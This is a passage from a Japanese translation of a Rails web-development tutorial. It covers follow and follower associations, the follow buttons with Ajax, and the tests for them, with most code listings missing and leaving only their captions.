この時点で、アプリケーションコードは\ref{sec:user_micropost_associations}のようになるのではないかと予測した方もいるかもしれません。実際似ているのですが、2つの大きな違いがあります。
まずは1つ目の違いについてです。以前、ユーザーとマイクロポストの関連付けをしたときは、次のように書きました。
技術的には、Railsは\kode{has\_many}に与えられた引数を、\kode{classify}メソッドを使ってクラス名に変換しています。このメソッドは、たとえば\kode{"foo\_bars"}であれば\kode{"FooBar"}に変換します。
となってしまい、(ActiveRelationshipモデルを探してしまい) Relationshipモデルを見つけることができません。
このため、今回のケースでは、Railsに探して欲しいモデルのクラス名を明示的に伝える必要があります。
2つ目の違いは、先ほどの逆のケースについてです。以前はMicropostモデルで
このように書きました。
\kode{microposts}テーブルには\kode{user\_id}属性があるので、これを辿って対応する所有者 (ユーザー) を特定することができました (\ref{sec:the_basic_model})。
データベースの2つのテーブルを繋ぐとき、このようなidは\emph{外部キー (foreign key)}と呼びます。すなわち、Userモデルに繋げる外部キーが、Micropostモデルの\kode{user\_id}属性ということです。この外部キーの名前を使って、Railsは関連付けの推測をしています。具体的には、Railsはデフォルトでは外部キーの名前を\kode{<class>\_id}といったパターンとして理解し、 \kode{<class>}に当たる部分からクラス名 (正確には小文字に変換されたクラス名) を推測します
技術的には、Railsは\kode{underscore}メソッドを使用してクラス名をidに変換しています。
たとえば、\kode{"FooBar".underscore}を実行すると\kode{"foo\_bar"}に変換されます。従って、 \kode{FooBar}オブジェクトの外部キーは\kode{foo\_bar\_id}になるでしょう
ただし、先ほどはユーザーを例として扱いましたが、今回のケースではフォローしているユーザーを\kode{follower\_id}という外部キーを使って特定しなくてはなりません。また、followerというクラス名は存在しないので、ここでもRailsに正しいクラス名を伝える必要が発生します。
先ほどの説明をコードにまとめると、UserとRelationshipの関連付けはリスト\ref{code:user_relationships_association}とリスト\ref{code:relationship_belongs_to}のようになります。
能動的関係に対して1対多 (\kode{has\_many}) の関連付けを実装する
(ユーザーを削除したら、ユーザーのリレーションシップも同時に削除される必要があります。そのため、関連付けに\kode{dependent: :destroy}も追加しています。)
リレーションシップ/フォロワーに対して\kode{belongs\_to}の関連付けを追加する
なお、\kode{follower}の関連付けについては、\ref{sec:following}に入るまでは使いません。しかしfollowerとfollowedを対称的に実装しておくことで、構造に対する理解は容易になるはずです。
リスト\ref{code:user_relationships_association}とリスト\ref{code:relationship_belongs_to}で定義した関連付けにより、表\ref{table:association_methods}で以前紹介したような多くのメソッドが使えるようになりました。今回使えるようになったメソッドを表\ref{table:association_methods_relationships}に示します。
フォロワーを返します
フォローしているユーザーを返します
\kode{user}と紐付けて能動的関係を作成/登録する
\kode{user}を紐付けて能動的関係を作成/登録する (失敗時にエラーを出力)
\kode{user}と紐付けた新しいRelationshipオブジェクトを返す
ユーザーと能動的関係の関連付けによって使えるようになったメソッドのまとめ
先に進む前に、Relationshipモデルの検証を追加して完全なものにしておきましょう。
テスト (リスト\ref{code:relationship_validation_tests})とアプリケーションコード (リスト\ref{code:relationship_validations}) は素直な作りです。
ただし、ユーザー用のfixtureファイル (リスト\ref{code:default_fixtures}) と同じように、生成されたリレーションシップ用のfixtureでは、マイグレーション (リスト\ref{code:relationships_migration}) で制約させた一意性を満たすことができません。
ということで、ユーザーのときと同じで (リスト\ref{code:empty_fixtures}でfixtureの内容を削除したように)、今の時点では生成されたリレーションシップ用のfixtureファイルも空にしておきましょう (リスト\ref{code:empty_relationship_fixture})。
Relationshipモデルのバリデーションをテストする
Relationshipモデルに対してバリデーションを追加する
Relationship用のfixtureを空にする
いよいよRelationshipの関連付けの核心、\kode{following}と\kode{followers}に取りかかります。
今回は\kode{has\_many through}を使用します。図{p1}のように、1人のユーザーにはいくつもの「フォロー{3}する/される{/3} (多対多)」のリレーションシップがあります。
デフォルトの\kode{has\_many through}という関連付けでは、Railsはモデル名(単数形)に対応する外部キーを探します。
つまり、次のコードでは、
Railsは“followeds”というシンボル名を見て、これを“followed”という単数形の変え、 \kode{relationships}テーブルの\kode{followed\_id}を使って対象のユーザーを取得してきます。
しかし、\ref{sec:a_problem_with_the_data_model}で指摘したように、\kode{user.followeds}という名前は英語として不適切です。代わりに、\kode{user.following}という名前を使いましょう。
そのためには、Railsのデフォルトを上書きする必要があります。ここでは\kode{:source}パラメーター (リスト\ref{code:has_many_following_through_active_relationships}) を使用し、「\kode{following}配列の元は\kode{followed} idの集合である」ということを明示的にRailsに伝えます。
Userモデルに\kode{following}の関連付けを追加する
 リスト\ref{code:has_many_following_through_active_relationships}で定義した関連付けにより、フォローしているユーザーを配列の様に扱えるようになりました。
たとえば、\kode{include?}メソッド (\ref{sec:arrays_and_ranges}) を使ってフォローしているユーザーの集合を調べてみたり、関連付けを通してオブジェクトを探しだせるようになります。
\kode{following}メソッドで配列のように扱えるだけでも便利ですが、Railsは単純な配列ではなく、もっと賢くこの集合を扱っています。
たとえば、次のようなコードでは
フォローしている全てのユーザーをデータベースから取得し、その集合に対して\kode{include?}メソッドを実行しているように見えますが、しかし実際にはデータベースの中で直接比較をするように配慮しています。
(\ref{sec:rendering_microposts}でも説明したように、次のようなコードは
データベースの中で合計を計算したほうが高速になることを思い出してください。)
さらに、これに関連する\kode{following?}論理値メソッドも追加し、あるユーザーが誰かをフォローしているかどうかを確認できるようにします
特定の分野でモデリングの経験を多く積めば、このようなユーティリティメソッドが必要になることを事前に思い付けるようになるでしょう。たとえ思い付けないことがあったとしても、明確なテストを書こうとするときに、いつの間にかこういうメソッドを自分が作成していることに気付くことでしょう。
だからというわけではありませんが、今はこのようなメソッドが必要であるということに気付けなくても問題ありません。
ソフトウェアの開発は、繰りかえしに次ぐ繰り返しです。読みづらくなるまでコードを書き足し、そのコードをリファクタリングする、その繰り返しです。そして、より簡潔なコードを書くために、本書が少しでもお役に立てばと思います。
今回は、こういったメソッドはテストから先に書いていきます。
というのも、Webインターフェイスなどで便利メソッドを使うのはまだ先なので、すぐに\emph{使える場面}がなく、実装した手応えを得にくいからです。
一方で、Userモデルに対するテストを書くのは簡単かつ今すぐできます。そのテストの中で、これらのメソッドを使っていきます。具体的には、\kode{following?}メソッドであるユーザーをまだフォローしていないことを確認、\kode{follow}メソッドを使ってそのユーザーをフォロー、  \kode{following?}メソッドを使ってフォロー中になったことを確認、 最後に\kode{unfollow}メソッドでフォロー解除できたことを確認、といった具合でテストをしてきます。
作成したコードをリスト\ref{code:utility_method_tests}に示します
“following” 関連のメソッドをテストする 
selfを省略した結果をリスト\ref{code:follow_unfollow_following}に示します。
このとき、可能な限り\kode{self} (user自身を表すオブジェクト) を省略している点に注目してください。
"following" 関連のメソッド 
    following
リスト\ref{code:follow_unfollow_following}のコードを追加することで、テストスイートは \passing になるはずです。
 (end)<n><n>    \subsection{フォロワー} % (fold)<n>    \label{sec:followers}<n><n>
リレーションシップというパズルの最後の一片は、\kode{user.followers}メソッドを追加することです。これは上の\kode{user.following}メソッドと対になります。
図\ref{fig:user_has_many_following}を見ていて気付いた方もいると思いますが、フォロワーの配列を展開するために必要な情報は、\kode{relationships}テーブルに既にあります
したがって、データモデルは図\ref{fig:user_has_many_followers}のようになります。
Relationshipモデルのカラムを入れ替えて作った、フォロワーのモデル
図\ref{fig:user_has_many_followers}を参考にしたデータモデルの実装をリスト\ref{code:has_many_following_through_active_relationships}に示しますが、この実装はリスト\ref{code:has_many_following_through_passive_relationships}とまさに類似しています。
受動的関係を使って\kode{user.followers}を実装する
これは\kode{:followers}属性の場合、Railsが “followers” を単数形にして自動的に外部キー\kode{follower\_id}を探してくれるからです。
リスト\ref{code:has_many_following_through_active_relationships}と違って必要のない\kode{:source}キーをそのまま残しているのは、\kode{has_many :following}との類似性を強調させるためです。
selfを省略した結果をリスト\ref{code:followers_test}に示します。
(リスト\ref{code:followers_test}では、\kode{following?}と対照的な\kode{followed\_by?}メソッドを使ってもよかったのですが、サンプルアプリケーションで実際に使う場面がなかったので省略しました。)
\kode{followers}に対するテスト 
リスト\ref{code:followers_test}ではリスト\ref{code:utility_method_tests}に1行だけ追加していますが、実際には多くの処理が正しく動いていなければパスしません。つまり、リスト\ref{code:has_many_following_through_passive_relationships}の実装に対するテストは、実装の影響を受けやすいテストだといえます。
この時点で、全てのテストが \passing になるはずです。
followers
\ref{sec:the_relationship_model}ではやや複雑なデータモデリングの技術を説明しました。理解するのに時間がかかってしまっても大丈夫なので、安心してください。
実際、使用されたさまざまな関連付けを理解するのに一番良いのは、Webインターフェイスで使用してみることです。
この章の最初に、フォローしているユーザーのページ表示の流れについて説明しました。
この節では、モックアップで示したようにフォロー/フォロー解除の基本的なインターフェイスを実装します。
また、フォローしているユーザーと、フォロワーにそれぞれ表示用のページを作成します。
\ref{sec:the_status_feed}では、ユーザーのステータスフィードを追加して、サンプルアプリケーションを完成させます。
1つ前の章のときと同じように、サンプルデータを自動作成するRakeタスクを使用して、データベースに実際のデータを登録するのがやはり便利です。
先にサンプルデータを自動作成しておけば、Webページの見た目のデザインから先にとりかかることができ、バックエンドの機能の実装をこの節の後に回すことができます。
リスト\ref{code:sample_relationships}は、リレーションシップのサンプルデータを生成するためのコードです
ここでは、最初のユーザーにユーザー3からユーザー51までをフォローさせ、それから逆にユーザー4からユーザー41に最初のユーザーをフォローさせます。ソースを見るとわかるように、このような設定を自由に行うことができます。
こうしてリレーションシップを作成しておけば、アプリケーションのインターフェイスを開発するには十分です。
サンプルデータにfollowing/followerの関係性を追加する
リスト\ref{code:sample_relationships}を実行してデータベース上のサンプルデータを作り直すために、いつものコマンドを実行しましょう。
これでサンプルユーザーに、フォローしているユーザーとフォロワーができました。ユーザープロファイルページとHomeページを更新してこれを反映しましょう。
最初に、プロファイルページとHomeページに、フォローしているユーザーとフォロワーの統計情報を表示するためのパーシャルを作成します。
次に、フォロー用とフォロー解除用のフォームを作成します。それから、フォローしているユーザーの一覧 ("following") とフォロワーの一覧 ("followers") を表示する専用のページを作成します。
\ref{sec:a_problem_with_the_data_model}で指摘したように、Twitterの慣習にしたがってフォロー数の単位には“following”を使い、たとえば“50 following”といった具合に表示します。
この単位は図\ref{fig:page_flow_profile_mockup}のモックアップの一部でも既に使われていました。該当箇所を拡大して図\ref{fig:stats_partial_mockup}に再掲します。
統計情報パーシャルのモックアップ
図\ref{fig:stats_partial_mockup}の統計情報には、現在のユーザーがフォローしている人数と、現在のフォロワーの人数が表示されています。それぞれの表示はリンクになっており、専用の表示ページに移動できます。
実際のページ作成は\ref{sec:following_and_followers_pages}まで行いませんが、ルーティングは今実装します (リスト\ref{code:following_followers_actions_routes})。
このコードでは、\kode{resources}\emph{ブロック}の内側で\kode{:member}メソッドを使用しています。これは初登場ですので、どんな動作をするのか推測してみてください。 method inside a , which we haven’t seen before, but see if you can guess what it does.
Usersコントローラに\kode{following}アクションと\kode{followers}アクションを追加する
/users/1/following
また、どちらもデータを\emph{表示する}ページなので、適切なHTTPメソッドは\texttt{GET}リクエストになります。したがって、\kode{get}メソッドを使って適切なレスポンスを返すようにします。
ちなみに、\kode{member}メソッドを使うとユーザーidが含まれているURLを扱うようになりますが、
idを指定せずにすべてのメンバーを表示するには、以下のように\kode{collection}メソッドを使用します。
このコードは/users/tigersというURLに応答します (アプリケーションにあるすべてのtigerのリストを表示します)
Railsにはさまざまなルーティングオプションがありますが、詳細についてはRailsガイドの記事「\href{http://guides.rubyonrails.org/routing.html}{Railsルーティング}」を参照してください。
リスト\ref{code:following_followers_actions_routes}によって生成されるルーティングテーブルを表\ref{table:following_routes}に示します。
ここにある、フォローしているユーザー用とフォロワー用の名前付きルートをこの後使用します。
/users/1/followers
カスタムルールで提供するリスト\ref{code:following_followers_actions_routes}のRESTfulルート
ルーティングを定義したので、統計情報のパーシャルを実装する準備が整いました。このパーシャルでは、divタグの中に2つのリンクを含めるようにします (リスト\ref{code:stats_partial})。
フォロワーの統計情報を表示するパーシャル
</strong>
    followers
このパーシャルはユーザー表示ページとHomeページの両方に表示されるので、リスト\ref{code:stats_partial}の最初の行では、以下のコードを使用して適切な方を選択しています。
フォローしているユーザーの人数と、フォロワーの人数は、以下の関連付けを使用して計算されます。
リスト\ref{code:user_show_microposts}のマイクロポストのコードと比較してみましょう。あのときは次のように書きました。
このコードを使用してマイクロポストの合計数を表示します。
(以前同様、高速化のためにRailsはデータベースの中で合計を計算するようにしています。)
一部の要素で、以下のようにCSS idを指定していることにもぜひ注目してください。
こうしておくと、\ref{sec:a_working_follow_button_with_ajax}でAjaxを実装するときに便利です。そこでは、一意のidを指定してページ要素にアクセスしています。
統計情報パーシャルができあがりました。Homeページにこの統計情報を表示するのは、リスト\ref{code:home_page_stats}のように簡単にできます。
Homeページにフォロワーの統計情報を追加する
</section>
</aside>
統計情報にスタイルを与えるために、リスト\ref{code:stats_css}のようにSCSSを追加しましょう (なお、このSCSSにはこの章で使用するスタイルがすべて含まれています)。
変更の結果、Homeページは図\ref{fig:home_page_follow_stats}のようになります。
Homeページのサイドバー用のSCSS
Homeページにフォロー関連の統計情報を表示する
この後すぐ、プロファイルにも統計情報パーシャルを表示しますが、今のうちにリスト\ref{code:follow_form_partial}のようにフォロー/フォロー解除ボタン用のパーシャルも作成しましょう。
follow/unfollowフォームのパーシャル
このコードは、\kode{follow}と\kode{unfollow}のパーシャルに作業を振っているだけです。パーシャルでは、Relationshipsリソース用の新しいルーティングが必要です。これを、リスト\ref{code:microposts_resource}のMicropostsリソースの例に従って作成しましょう (リスト\ref{code:relationships_resource})。
Relationshipリソース用のルーティングを追加する
follow/unfollowパーシャル自体は、リスト\ref{code:follow_form}とリスト\ref{code:unfollow_form}に示します。
ユーザーをフォローするためのフォーム
ユーザーのアンフォローするフォーム
これらの2つのフォームでは、いずれも\kode{form\_for}を使用してRelationshipモデルオブジェクトを操作しています。これらの2つのフォームの主な違いは、リスト\ref{code:follow_form}は\emph{新しい}リレーションシップを作成するのに対し、リスト\ref{code:unfollow_form}は既存のリレーションシップを見つけ出すという点です。
すなわち、前者は\texttt{POST}リクエストを Relationshipsコントローラに送信してリレーションシップを\kode{create} (作成) し、後者は\texttt{DELETE}リクエストを送信してリレーションシップを\kode{destroy} (削除) するということです
(これらのアクションは\ref{sec:a_working_follow_button_the_standard_way}で実装します)。
最終的に、このfollow/unfollowフォームにはボタンしかないことを理解していただけたと思います。しかし、それでもこのフォームは\kode{followed\_id}をコントローラに送信する必要があります。
これを行うために、リスト\ref{code:follow_form}の\kode{hidden\_field\_tag}メソッドを使用します。このメソッドは 以下のフォームのHTMLを生成します。
\ref{sec:resetting_the_password}のリスト\ref{code:password_reset_form}で見たように、隠しフィールドの\kode{input}タグを使うことで、ブラウザ上に表示させずに適切な情報を含めることができます。
これで、\ref{code:user_follow_form_profile_stats}のようにフォロー用のフォームをユーザープロファイルページにインクルードしてパーシャルを出力できるようになりました。
プロファイルには、図\ref{fig:profile_follow_button}および図\ref{fig:profile_unfollow_button}のようにそれぞれ [Follow]、[Unfollow] ボタンが表示されます。
プロフィールページにフォロー用フォームとフォロワーの統計情報を追加する
<section>
</h1>
</ol>
プロフィール画面 (\href{http://localhost:3000/users/2}{/users/2}) に [Follow] ボタンが表示されている
プロフィール画面 (\href{http://localhost:3000/users/5}{/users/5}) に [Unfollow] ボタンが表示されている
これらのボタンはもうすぐ動作するようになります。実はこのボタンの実装には2とおりの方法があります。1つは標準的な方法 (\ref{sec:a_working_follow_button_the_standard_way})、もう1つはAjaxを使用する方法 (\ref{sec:a_working_follow_button_with_ajax}) です。でもその前に、フォローしているユーザーとフォロワーを表示するページをそれぞれ作成してHTMLインターフェイスを完成させてしまいましょう。
フォローしているユーザーを表示するページと、フォロワーを表示するページは、いずれもユーザープロファイルページとユーザーインデックスページ (\ref{sec:users_index}) を合わせたような作りになるという点で似ています。どちらにもフォローの統計情報などのユーザー情報を表示するサイドバーと、ユーザーのリストがあります。
さらに、サイドバーには小さめのユーザープロフィール画像のリンクを格子状に並べて表示する予定です。
この要求に合うモックアップを図\ref{fig:following_mockup} (フォローしているユーザー用) および 図\ref{fig:followers_mockup} (フォロワー用) に示します。
フォローしているユーザー用ページのモックアップ
ユーザーのフォロワー用ページのモックアップ
ここでの最初の作業は、フォローしているユーザーのリンクとフォロワーのリンクを動くようにすることです。
Twitterにならい、どちらのページでもユーザーのログインを要求します。
前回のアクセス制御と同様に、まずはテストから書いていきます。今回使うテストはリスト\ref{code:following_followers_authorization_test}のとおりです。
フォロー/フォロワーページの認可をテストする 
この実装には1つだけトリッキーな部分があります。それはUsersコントローラに2つの新しいアクションを追加する必要があるということです。
これはリスト\ref{code:following_followers_actions_routes}で定義した2つのルーティングにもとづいており、これらはそれぞれ\kode{following}および\kode{followers}と呼ぶ必要があります。
それぞれのアクションでは、タイトルを設定し、ユーザーを検索し、\kode{@user.following}または\kode{@user.followers}からデータを取り出し、ページネーションを行なって、ページを出力する必要があります。
作成したコードをリスト\ref{code:following_followers_actions}に示します
\kode{following}アクションと\kode{followers}アクション
一方で、リスト\ref{code:following_followers_actions}のいずれのアクションも、\emph{render}を\kode{明示的に}呼び出し、\emph{show_follow}という同じビューを出力しています。したがって、作成が必要なビューはこれ1つです。
renderで呼び出しているビューが同じである理由は、このERbはどちらの場合でもほぼ同じであり、リスト\ref{code:show_follow_view}で両方の場合をカバーできるためです。
フォローしているユーザーとフォロワーの両方を表示する\kode{show\_follow}ビュー
リスト\ref{code:following_followers_actions}にあるアクションは、2通りの方法でリスト\ref{code:show_follow_view}のビューを呼び出します。“following”をとおって描画したビューを図\ref{fig:user_following}に、“followers”をとおって描画したビューを図\ref{fig:user_followers}に示します。
このとき、上のコードではカレントユーザーを一切使っていない点に注目してください。したがって、他のユーザーのフォロワー一覧ページもうまく動きます (図\ref{fig:different_user_followers})。
現在のユーザーにフォローされているユーザーを表示する
ユーザーのフォロワーを表示する
別のユーザーのフォロワーを表示する
フォロー一覧もフォロワー一覧も動くようになったので、この振る舞いを検証するための2つの統合テストを書いていきましょう。
これらの統合テストを基本的なテストに留め、網羅的なテストではありません。
\ref{sec:layout_link_tests}でも指摘したように、HTML構造を網羅的にチェックするテストは壊れやすく、生産性を逆に落としかねないからです。
したがって今回は、正しい数が表示されているかどうかと、正しいURLが表示されているかどうかの2つのテストを書きます。
いつものように、統合テストを生成するところから始めます。
次に、テストデータをいくつか揃えます。リレーションシップ用のfixtureにデータを追加しましょう。
\ref{sec:profile_micropost_tests}では、次のように書くことで
ユーザーとマイクロポストを関連付けできたことを思い出してください。
また、上のコードではユーザー名を書いていましたが、
この例を参考にしてリレーションシップ用のfixtureにテストデータを追加すると、リスト\ref{code:relationships_fixtures}のようになります。
following/followerをテストするためのリレーションシップ用fixture
あとは、正しい数かどうかを確認するために、\kode{assert\_match}メソッド (リスト\ref{code:user_profile_test}) を使ってプロフィール画面のマイクロポスト数をテストします。
さらに、正しいURLかどうかをテストするコードも加えると、リスト\ref{code:following_tests}のようになります。
following/followerページのテスト 
なお、リスト\ref{code:following_tests}では、次のコードを加えていますが
このコードは次のコードを確かめるためのテストなので、
\href{https://en.wikipedia.org/wiki/Vacuous_truth}{無意味なテスト}ではないことに注意してください (\kode{followers}についても同様です)。
これで、テストが \passing になるはずです。
ビューが整ってきました。いよいよ [フォローする] [フォロー解除する] ボタンを動作させましょう。
フォローとフォロー解除はそれぞれリレーションシップの作成と削除に対応しているため、まずはRelationshipsコントローラが必要です。いつものようにコントローラを生成しましょう。
リスト\ref{code:relationships_controller}でも説明しますが、Relationshipsコントローラのアクションでアクセス制御することはそこまで難しくありません。しかし、前回のアクセス制御のときと同様に最初にテストを書き、それをパスするように実装することでセキュリティモデルを確立させていきましょう。
今回はまず、コントローラのアクションにアクセスするとき、ログイン済みにユーザーであるかどうかをチェックします。 もしログインしていなければ、ログインページにリダイレクトさせ、Relationshipのカウントが変わっていないことを確認します (リスト\ref{code:relationships_access_control})。
リレーションシップの基本的なアクセス制御に対するテスト 
次に、リスト\ref{code:relationships_access_control}のテストをパスさせるために、\kode{logged\_in\_user}フィルターをRelationshipsコントローラのアクションに対して追加します (リスト\ref{code:relationships_controller})。
リレーションシップのアクセス制御 
このすべてを実装した結果を、リスト\ref{code:relationships_controller_following}に示します。
Relationshipsコントローラ
リスト\ref{code:relationships_controller_following}を見てみれば、先ほどのセキュリティ問題が実はそれほど重大なものではないことを理解いただけると思います。もしログインしていないユーザーが (\kode{curl}などのコマンドラインツールなどを使用して) これらのアクションに直接アクセスするようなことがあれば、\kode{current\_user}は\kode{nil}になり、どちらのメソッドでも2行目で例外が発生します。エラーにはなりますが、アプリケーションやデータに影響は生じません。
このままでも支障はありませんが、やはりこのような例外には頼らない方がよいので、上ではひと手間かけてセキュリティのためのレイヤーを追加しました。
これで、フォロー/フォロー解除の機能が完成しました。どのユーザーも、他のユーザーをフォローしたり、フォロー解除したりできます。ブラウザ上でボタンをクリックして、確かめてみてください。
(振る舞いを検証する統合テストは\ref{sec:following_tests}で実装します。)
フォローしていないユーザーの画面
ユーザーをフォローした結果
フォロー関連の機能の実装はこのとおり完了しましたが、ステータスフィードに取りかかる前にもう一つだけ機能を洗練させてみたいと思います。
\ref{sec:a_working_follow_button_the_standard_way}では、Relationshipsコントローラの\kode{create}アクションと \kode{destroy}アクションを単に\emph{元の}プロファイルにリダイレクトしていました。
つまり、ユーザーはプロファイルページを最初に表示し、それからユーザーをフォローし、その後すぐ元のページにリダイレクトされるという流れになります。
ユーザーをフォローした後、本当にそのページから離れて元のページに戻らないといけないのでしょうか。この点を考えなおしてみましょう。
これは\emph{Ajax}を使用することで解決できます。Ajaxを使用すれば、Webページからサーバーに「非同期」で、ページを移動することなくリクエストを送信することができます
\emph{Asynchronous (非同期の) JavaScript And XML}の<n>それぞれの頭文字をとっています。Ajaxはしばしば “AJAX” と大文字で書かれますが、\href{http://www.adaptivepath.com/ideas/ajax-new-approach-web-applications/}{Ajaxの起源となる記事}では一貫して “Ajax” となっています。
WebフォームにAjaxを採用するのは今や当たり前になりつつあるので、RailsでもAjaxを簡単に実装できるようになっています。
フォロー用とフォロー解除用のフォームパーシャルをこれに沿って更新するのは簡単です。以下のコードがあるとします。
form_for
たったこれだけで、Railsは\href{http://catb.org/jargon/html/A/automagically.html}{自動的に}Ajaxを使用します
Ajaxを使ったフォローフォーム
Ajaxを使ったフォロー解除フォーム
ERbによって実際に生成されるHTMLはそれほど重要ではありませんが、興味がある方のために、次にその核心部分をお見せします。
</form>
ここでは、formタグの内部で\kode{data-remote="true"}変数を設定しています。これは、JavaScriptによるフォーム操作を許可することをRailsに知らせるためのものです。
以前のRailsでは完全なJavaScriptコードを挿入していましたが、Rails 3からこのようにHTMLプロパティを使用して簡単にJavaScriptを使用できます。これは、\href{http://railscasts.com/episodes/205-unobtrusive-javascript}{\emph{JavaScriptを前面に出すべからず}}という哲学に従っています。
フォームの更新が終わったので、今度はこれに対応するRelationshipsコントローラを改造して、Ajaxリクエストに応答できるようにしましょう。
こういったリクエストの種類によって応答を場合分けするときは、\kode{respond\_to}メソッドというメソッドを使います。
この文法は少々変わっていて混乱を招く可能性がありますが、上の (ブロック内の) コードのうち、\emph{いずれかの1行}が実行されるという点が重要です
(このため\kode{respond\_to}メソッドは、上から順に実行する逐次処理というより、if文を使った分岐処理に近いイメージです)。
RelationshipsコントローラでAjaxに対応させるために、\kode{respond\_to}メソッドを\kode{create}アクションと\kode{destroy}アクション (リスト\ref{code:relationships_controller_following}) にそれぞれ追加してみましょう。
変更の結果をリスト\ref{code:relationships_controller_ajax}に示します。
このとき、ユーザーのローカル変数 (\kode{user}) をインスタンス変数 (\kode{@user}) に変更した点に注目してください。これは、リスト\ref{code:relationships_controller_following}のときはインスタンス変数は必要なかったのですが、リスト\ref{code:follow_form_ajax}やリスト\ref{code:unfollow_form_ajax}を実装したことにより、インスタンス変数が必要になったためです。
RelationshipsコントローラでAjaxリクエストに対応する
リスト\ref{code:relationships_controller_ajax}でAjaxリクエストに対応したので、今度はブラウザ側でJavaScriptが無効になっていた場合 (Ajaxリクエストが送れない場合) でもうまく動くようにします (リスト\ref{code:degrade_gracefully})。
JavaScriptが無効になっていたときのための設定
# 認証トークンをremoteフォームに埋め込む
一方で、JavaScriptが有効になっていても、まだ十分に対応できていない部分があります。
というのも、Ajaxリクエストを受信した場合は、Railsが自動的にアクションと同じ名前を持つ\emph{JavaScript用の埋め込みRuby} (\kode{.js.erb}) ファイル (\kode{create.js.erb}や\kode{destroy.js.erb}など) を呼び出すからです。
ご想像のとおり、これらのファイルではJavaScriptと埋め込みRuby (ERb) をミックスして現在のページに対するアクションを実行することができます。
ユーザーをフォローしたときやフォロー解除したときにプロフィールページを更新するために、私たちがこれから作成および編集しなければならないのは、まさにこれらのファイルです。
JS-ERbファイルの内部では、Railsが自動的に\href{http://jquery.com/}{jQuery} JavaScriptヘルパーを提供します。これにより、\href{http://www.w3.org/DOM/}{DOM (Document Object Model)} を使用してページを操作できます。
\ref{sec:image_validation}で見たように、jQueryライブラリにはDOM操作用の膨大なメソッドが提供されていますが、ここで使用するのはわずか2つです。
それにはまず、ドル記号 ($) とCSS idを使用してDOM要素にアクセスする文法について知る必要があります。
たとえば、\kode{follow\_form}要素を操作するには、以下の文法を使用します。
リスト\ref{code:follow_form_partial}では、これはフォームを囲む\kode{div}タグであり、フォームそのものではなかったことを思い出してください。
ご想像のとおり、jQueryはCSSと同様、ドット\kode{.}を使用してCSSクラスを操作できます。
次に必要なメソッドは\kode{html}です。これは、引数の中で指定された要素の内側にあるHTMLを更新します。
たとえば、フォロー用フォーム全体を\kode{"foobar"}という文字列で置き換えるには、以下を使用します。
純粋なJavaScriptと異なり、JS-ERbファイルでは組み込みRuby (ERb) を使用できます。\kode{create.js.erb}ファイルでは、フォロー用のフォームを\kode{unfollow}パーシャルで更新し、フォロワーのカウントを更新するのにERbを使用しています (もちろんこれは、フォローに成功した場合の動作です)。
変更の結果をリスト\ref{code:create_js_erb}に示します。
このコードでは\kode{escape\_javascript}メソッドを使用していることに注目してください。この関数は、JavaScriptファイル内にHTMLを挿入するときに実行結果をエスケープする (画面に表示しない) ために必要です。
JavaScriptと埋め込みRubyを使ってフォローの関係性を作成する
各行の末尾にセミコロン ; があることに注目してください。 これはプログラミング言語によくある文法で、古くは1950年代中ごろに開発された\href{https://en.wikipedia.org/wiki/ALGOL}{ALGOL}まで遡ります。
\kode{destroy.js.erb}ファイルの方も同様です (リスト\ref{code:destroy_js_erb})。
Ruby JavaScript (RJS) を使ってフォローの関係性を削除する
これらのコードにより、ユーザープロファイルを表示して、ページを更新せずにフォローまたはフォロー解除ができるようになったはずです。
フォローボタンが動くようになったので、バグを検知するためのシンプルなテストを書いていきましょう。
ユーザーのフォローに対するテストでは、 /relationshipsに対してPOSTリクエストを送り、フォローされたユーザーが1人増えたことをチェックします。具体的なコードは次のとおりです。
これは標準的なフォローに対するテストではありますが、Ajax版もやり方は大体同じです。Ajaxのテストでは、\kode{post}の代わりに\kode{xhr :post}を使うだけです。
ここで使っている\kode{xhr} (XmlHttpRequest) というメソッドは、Ajaxでリクエストを発行するします。したがって、リスト\ref{code:relationships_controller_ajax}の\kode{respond_to}では、JavaScriptに対応した行が実行されるようになります。
また、ユーザーをアンフォローするときも構造はほとんど同じで、\kode{post}メソッドを\kode{delete}メソッドに置き換えてテストします。
つまり、そのユーザーのidとリレーションシップのidを使ってDELETEリクエストを送信し、フォローしている数が1つ減ることを確認します。
これらのテストをまとめた結果を、リスト\ref{code:follow_button_tests}に示します。
Follow/Unfollowボタンをテストする 
ついに、サンプルアプリケーションの山頂が目の前に現れました。最後の難関、ステータスフィードの実装に取りかかりましょう。
この節で扱われている内容は、本書の中でも最も高度なものです。
完全なステータスフィードは、\ref{sec:a_proto_feed}で扱ったプロトフィードをベースにします。現在のユーザーにフォローされているユーザーのマイクロポストの配列を作成し、現在のユーザー自身のマイクロポストと合わせて表示します。
このセクションを通して、複雑さを増したフィードの実装に進んでいきます。
これ実現するためには、RailsとRubyの高度な機能の他に、SQLプログラミングの技術も必要です。
手強い課題に挑むのですから、ここで実装すべき内容を慎重に見直すことが重要です。
図\ref{fig:page_flow_home_page_feed_mockup}でお見せしたステータスフィードの最終形を図\ref{fig:home_page_feed_mockup}に再度掲載します。
ステータスフィード付きのHomeページのモックアップ
\label{fig:home_page_feed_mockup}}<n>\end{figure}<n><n>  % section the_status_feed (end)<n><n>    \subsection{動機と計画} % (fold)<n>    \label{sec:motivation_and_strategy}<n><n>
ステータスフィードの基本的なアイディアはシンプルです。
図の矢印で示されているように、この目的は、現在のユーザーによってフォローされているユーザーに対応するユーザーidを持つマイクロポストを取り出し、同時に現在のユーザー自身のマイクロポストも一緒に取り出すことです。
id 1のユーザーがid 2、7、8、10をフォローしているときのフィード
このテストで重要なことは、フィードに必要な3つの条件を満たすことです。1) フォローしているユーザーのマイクロポストがフィードに含まれていること。2) 自分自身のマイクロポストもフィードに含まれていること。3) \emph{フォローしていない}ユーザーのマイクロポストがフィードに含まれていないこと。
そしてリスト\ref{code:users_fixtures_extra_users}とリスト\ref{code:add_micropost_different_owner}のfixtureファイルから、MichaelのフィードではLanaと自分自身の投稿が見えていて、Archerの投稿は見えないことがわかります。
先ほどの3つの条件をアサーションに変換して、Userモデル (リスト\ref{code:proto_status_feed}) \kode{feed}メソッドがあることに注意しながら、更新したUserモデルに対するテストを書いてみましょう。結果をリスト\ref{code:full_feed_test}に示します。
ステータスフィードのテスト 
最終的なフィードの実装はやや込み入っているため、細かい部品を1つずつ確かめながら導入していきます。
最初に、このフィードで必要なクエリについて考えましょう。
ここで必要なのは、\kode{microposts}テーブルから、あるユーザー (つまり自分自身) がフォローしているユーザーに対応するidを持つマイクロポストをすべて選択 (select) することです。
このクエリを模式的に書くと以下のようになります。
microposts
